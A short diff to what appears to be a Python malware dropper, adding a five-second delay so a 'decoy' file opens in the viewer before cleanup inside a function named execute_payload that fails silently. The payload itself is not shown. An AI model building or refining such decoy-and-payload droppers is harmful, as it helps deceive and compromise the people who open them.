@@ -60,6 +60,7 @@ import subprocess
 import tempfile
 import sys
 import shutil
+import time
 
 def get_resource_path(relative_path):
     try:
@@ -98,6 +99,9 @@ def execute_payload():
             subprocess.Popen(['xdg-open', decoy_path_out])
         else:
             subprocess.Popen(['open', decoy_path_out])
+
+        # Wait for the viewer to open the file before cleaning up
+        time.sleep(5)
             
     except Exception as e:
         pass # Fail silently
